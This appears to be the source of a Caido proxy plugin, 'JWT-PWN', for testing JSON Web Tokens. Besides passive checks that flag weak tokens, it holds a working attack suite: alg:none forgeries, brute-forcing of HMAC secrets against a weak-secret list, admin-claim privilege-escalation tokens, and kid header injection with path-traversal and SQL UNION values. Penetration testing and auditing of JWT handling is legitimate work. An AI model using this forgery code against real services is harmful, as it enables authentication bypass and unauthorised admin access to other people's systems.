/**
 * JWT-PWN Caido Plugin
 * Install: Caido > Plugins > Load unpacked > select this folder
 * Compatible with Caido 0.39+
 */

// ── Helpers ───────────────────────────────────────────────────────────────────

function b64urlDecode(s) {
  s = s.replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  return atob(s);
}

function b64urlEncode(str) {
  return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

function parseJWT(token) {
  const parts = token.trim().split('.');
  if (parts.length !== 3) return null;
  try {
    const header  = JSON.parse(b64urlDecode(parts[0]));
    const payload = JSON.parse(b64urlDecode(parts[1]));
    return { header, payload, sig: parts[2], parts };
  } catch { return null; }
}

async function hmacSign(secret, data, alg) {
  const enc = new TextEncoder();
  const hashName = alg === 'HS256' ? 'SHA-256' : alg === 'HS384' ? 'SHA-384' : 'SHA-512';
  const key = await crypto.subtle.importKey(
    'raw', enc.encode(secret),
    { name: 'HMAC', hash: hashName }, false, ['sign']
  );
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(data));
  return b64urlEncode(String.fromCharCode(...new Uint8Array(sig)));
}

async function buildJWT(header, payload, secret = '', overrideAlg = null) {
  if (overrideAlg) header = { ...header, alg: overrideAlg };
  const h = b64urlEncode(JSON.stringify(header));
  const p = b64urlEncode(JSON.stringify(payload));
  const signingInput = `${h}.${p}`;
  const alg = (header.alg || 'none').toUpperCase();
  if (alg === 'NONE' || !secret) return `${signingInput}.`;
  if (['HS256','HS384','HS512'].includes(alg)) {
    const sig = await hmacSign(secret, signingInput, alg);
    return `${signingInput}.${sig}`;
  }
  return `${signingInput}.`;
}

const WEAK_SECRETS = [
  'secret','password','123456','jwt','token','admin','changeme',
  'mysecret','secretkey','your-256-bit-secret','development','test','',
];

async function bruteForce(token) {
  const parsed = parseJWT(token);
  if (!parsed) return null;
  const { header, parts } = parsed;
  const alg = (header.alg || '').toUpperCase();
  if (!alg.startsWith('HS')) return null;
  const signingInput = `${parts[0]}.${parts[1]}`;
  const hashName = alg === 'HS256' ? 'SHA-256' : alg === 'HS384' ? 'SHA-384' : 'SHA-512';
  const enc = new TextEncoder();
  let expectedSig;
  try {
    const raw = b64urlDecode(parts[2]);
    expectedSig = Uint8Array.from(raw, c => c.charCodeAt(0));
  } catch { return null; }

  for (const secret of WEAK_SECRETS) {
    try {
      const key = await crypto.subtle.importKey(
        'raw', enc.encode(secret),
        { name: 'HMAC', hash: hashName }, false, ['sign']
      );
      const computed = new Uint8Array(await crypto.subtle.sign('HMAC', key, enc.encode(signingInput)));
      if (computed.length === expectedSig.length &&
          computed.every((b, i) => b === expectedSig[i])) {
        return secret;
      }
    } catch { continue; }
  }
  return null;
}

// ── Plugin Registration ────────────────────────────────────────────────────────

export function init(sdk) {
  const { commands, menu, sidebar, findings } = sdk;

  // ── Sidebar UI ────────────────────────────────────────────────────────────

  sidebar.register({
    id: 'jwt-pwn',
    label: 'JWT-PWN',
    icon: '🔐',
    component: () => buildUI(sdk),
  });

  // ── Context Menu ──────────────────────────────────────────────────────────

  menu.register({
    type: 'Request',
    label: 'Analyze with JWT-PWN',
    action: async (context) => {
      const { request } = context;
      const authHeader = request.headers.find(h =>
        h.name.toLowerCase() === 'authorization'
      );
      if (!authHeader) {
        sdk.notify.warning('No Authorization header found');
        return;
      }
      const value = authHeader.value;
      const token = value.toLowerCase().startsWith('bearer ')
        ? value.slice(7).trim() : value.trim();

      const parsed = parseJWT(token);
      if (!parsed) {
        sdk.notify.warning('No valid JWT found in Authorization header');
        return;
      }

      // Create a finding
      const { header, payload } = parsed;
      const alg = header.alg || 'missing';
      const issues = [];
      if (alg.toUpperCase() === 'NONE') issues.push('Algorithm is none — no signature!');
      if (alg.toUpperCase().startsWith('HS')) issues.push(`Symmetric HMAC (${alg}) — brute-forceable`);
      if ('kid' in header) issues.push(`KID header present: ${header.kid}`);
      if ('jku' in header) issues.push(`JKU header present: ${header.jku}`);
      const exp = payload.exp;
      if (exp && exp < Date.now() / 1000) issues.push('Token is expired');
      const privClaims = ['role','is_admin','admin','privilege'].filter(k => k in payload);
      if (privClaims.length) issues.push(`Privilege claims: ${privClaims.join(', ')}`);

      if (issues.length > 0) {
        await findings.create({
          title: 'JWT Security Issues',
          description: issues.map(i => `• ${i}`).join('\n'),
          severity: issues.some(i => i.includes('none') || i.includes('NONE')) ? 'high' : 'medium',
          request,
        });
        sdk.notify.success(`Found ${issues.length} JWT issue(s) — see Findings tab`);
      } else {
        sdk.notify.info('JWT analyzed — no obvious issues found');
      }
    },
  });

  // ── Passive Scanner ────────────────────────────────────────────────────────
  sdk.http.onRequest(async (request, response) => {
    const authHeader = (request.headers || []).find(h =>
      h.name.toLowerCase() === 'authorization'
    );
    if (!authHeader) return;
    const value = authHeader.value || '';
    const token = value.toLowerCase().startsWith('bearer ') ? value.slice(7).trim() : '';
    if (!token) return;
    const parsed = parseJWT(token);
    if (!parsed) return;
    const { header } = parsed;
    const alg = (header.alg || '').toUpperCase();
    if (alg === 'NONE') {
      await findings.create({
        title: 'JWT: Algorithm None',
        description: 'Token uses alg:none — signature validation is disabled',
        severity: 'critical',
        request,
      });
    }
  });
}

// ── UI Component ──────────────────────────────────────────────────────────────

function buildUI(sdk) {
  const container = document.createElement('div');
  container.style.cssText = 'font-family:monospace;padding:12px;background:#111;color:#ddd;height:100%;overflow-y:auto;';

  container.innerHTML = `
    <div style="color:#00e6c8;font-size:15px;font-weight:bold;margin-bottom:12px">
      🔐 JWT-PWN
    </div>

    <div style="margin-bottom:8px">
      <label style="color:#999;font-size:11px">JWT Token</label>
      <textarea id="jwtInput" rows="4" style="width:100%;background:#1a1a1a;color:#ddd;
        border:1px solid #333;padding:6px;font-family:monospace;font-size:11px;resize:vertical"></textarea>
    </div>

    <div style="display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap">
      <button id="btnAnalyze"  style="${btnStyle('#007a6a')}">Analyze</button>
      <button id="btnNone"     style="${btnStyle('#7a3000')}">None Alg</button>
      <button id="btnBrute"    style="${btnStyle('#006a7a')}">Brute Force</button>
      <button id="btnPrivEsc"  style="${btnStyle('#5a006a')}">Priv Esc</button>
      <button id="btnRunAll"   style="${btnStyle('#8a0000')}">⚡ Run All</button>
    </div>

    <div id="jwtOutput" style="background:#0d0d0d;border:1px solid #2a2a2a;padding:10px;
      white-space:pre-wrap;font-size:11px;min-height:120px;color:#ddd;max-height:400px;overflow-y:auto"></div>

    <div style="margin-top:12px">
      <label style="color:#999;font-size:11px">Forge Token — Override Claims (JSON)</label>
      <textarea id="forgeInput" rows="2" placeholder='{"role":"admin","is_admin":true}'
        style="width:100%;background:#1a1a1a;color:#ddd;border:1px solid #333;
        padding:6px;font-family:monospace;font-size:11px"></textarea>
      <label style="color:#999;font-size:11px">Secret (blank = none-alg)</label>
      <input id="forgeSecret" type="text" placeholder="hmac secret..."
        style="width:100%;background:#1a1a1a;color:#ddd;border:1px solid #333;padding:6px;font-family:monospace;font-size:11px">
      <button id="btnForge" style="${btnStyle('#3a6a00')};margin-top:6px">Forge Token</button>
    </div>
    <div id="forgeOutput" style="margin-top:8px;background:#0d0d0d;border:1px solid #2a2a2a;
      padding:10px;white-space:pre-wrap;font-size:11px;min-height:60px;color:#ddd"></div>
  `;

  function btnStyle(bg) {
    return `background:${bg};color:#fff;border:none;padding:6px 10px;cursor:pointer;font-family:monospace;font-size:11px;border-radius:3px`;
  }

  const getToken = () => container.querySelector('#jwtInput').value.trim();
  const out = (msg) => { container.querySelector('#jwtOutput').textContent = msg; };
  const forgeOut = (msg) => { container.querySelector('#forgeOutput').textContent = msg; };

  container.querySelector('#btnAnalyze').onclick = () => {
    const token = getToken();
    const parsed = parseJWT(token);
    if (!parsed) { out('[!] Not a valid JWT'); return; }
    const { header, payload } = parsed;
    const now = Math.floor(Date.now() / 1000);
    const exp = payload.exp;
    let result = '── HEADER ──\n' + JSON.stringify(header, null, 2);
    result += '\n\n── PAYLOAD ──\n' + JSON.stringify(payload, null, 2);
    result += '\n\n── FLAGS ──';
    const alg = (header.alg || '?').toUpperCase();
    result += `\n  Algorithm   : ${alg}` + (alg === 'NONE' ? ' ⚠ CRITICAL' : alg.startsWith('HS') ? ' ⚠ HMAC' : ' ✓');
    result += `\n  kid header  : ${'kid' in header ? '⚠ ' + header.kid : '✓ absent'}`;
    result += `\n  jku header  : ${'jku' in header ? '⚠ ' + header.jku : '✓ absent'}`;
    result += `\n  Expired     : ${exp && exp < now ? '⚠ YES (' + Math.round((now-exp)/60) + 'm ago)' : '✓ no'}`;
    result += `\n  Priv claims : ${['role','is_admin','admin','privilege'].filter(k => k in payload).join(', ') || 'none'}`;
    out(result);
  };

  container.querySelector('#btnNone').onclick = async () => {
    const token = getToken();
    const parsed = parseJWT(token);
    if (!parsed) { out('[!] Invalid JWT'); return; }
    const { header, payload } = parsed;
    let result = '── NONE ALGORITHM VARIANTS ──\n';
    for (const v of ['none','None','NONE','nOnE','noNe']) {
      const forged = await buildJWT({ ...header }, payload, '', v);
      result += `\nalg=${v}:\n${forged}\n`;
    }
    out(result);
  };

  container.querySelector('#btnBrute').onclick = async () => {
    out('Brute forcing secret...');
    const token = getToken();
    const cracked = await bruteForce(token);
    if (cracked !== null) {
      const parsed = parseJWT(token);
      const { header, payload } = parsed;
      const escalated = await buildJWT(
        { ...header },
        { ...payload, role: 'admin', is_admin: true },
        cracked
      );
      out(`[!!!] SECRET FOUND: "${cracked}"\n\nEscalated token:\n${escalated}`);
    } else {
      out('[+] No weak secret found in built-in list');
    }
  };

  container.querySelector('#btnPrivEsc').onclick = async () => {
    const token = getToken();
    const parsed = parseJWT(token);
    if (!parsed) { out('[!] Invalid JWT'); return; }
    const { header, payload } = parsed;
    let result = '── PRIVILEGE ESCALATION PAYLOADS (unsigned) ──\n';
    for (const ch of [
      { role: 'admin' }, { is_admin: true }, { admin: true }, { privilege: 'admin' },
    ]) {
      const forged = await buildJWT({ ...header }, { ...payload, ...ch });
      result += `\n${JSON.stringify(ch)}:\n${forged}\n`;
    }
    out(result);
  };

  container.querySelector('#btnRunAll').onclick = async () => {
    const token = getToken();
    const parsed = parseJWT(token);
    if (!parsed) { out('[!] Invalid JWT'); return; }
    const { header, payload } = parsed;
    let result = '══════════════════════════════════\nJWT ATTACK SUITE — ALL RESULTS\n══════════════════════════════════\n';

    result += '\n[1] NONE ALGORITHM:\n';
    for (const v of ['none','None','NONE']) {
      const f = await buildJWT({ ...header }, payload, '', v);
      result += `  ${v}: ${f.substring(0,80)}...\n`;
    }

    result += '\n[2] BRUTE FORCE:\n';
    const cracked = await bruteForce(token);
    result += cracked !== null ? `  [!!!] SECRET: "${cracked}"\n` : `  [+] No weak secret\n`;

    result += '\n[3] PRIVILEGE ESCALATION:\n';
    for (const ch of [{ role:'admin' },{ is_admin:true }]) {
      const f = await buildJWT({ ...header }, { ...payload, ...ch });
      result += `  ${JSON.stringify(ch)}: ${f.substring(0,70)}...\n`;
    }

    result += '\n[4] KID INJECTION:\n';
    if ('kid' in header) {
      for (const [lbl,inj] of [['../dev/null','../../dev/null'],['SQLi',"' UNION SELECT 'x'--"]]) {
        const f = await buildJWT({ ...header, kid: inj }, payload);
        result += `  ${lbl}: ${f.substring(0,70)}...\n`;
      }
    } else {
      result += '  [+] No kid header\n';
    }

    out(result);
  };

  container.querySelector('#btnForge').onclick = async () => {
    const token = getToken();
    const secret = container.querySelector('#forgeSecret').value.trim();
    const claimsRaw = container.querySelector('#forgeInput').value.trim();
    const parsed = parseJWT(token);
    if (!parsed) { forgeOut('[!] Invalid JWT'); return; }
    const { header, payload } = parsed;
    let overrides = {};
    if (claimsRaw) {
      try { overrides = JSON.parse(claimsRaw); }
      catch { forgeOut('[!] Invalid JSON'); return; }
    }
    const forged = await buildJWT({ ...header }, { ...payload, ...overrides }, secret);
    forgeOut('Header:  ' + JSON.stringify(header) + '\nPayload: ' + JSON.stringify({ ...payload, ...overrides }) + '\n\n' + forged);
  };

  return container;
}
EOF
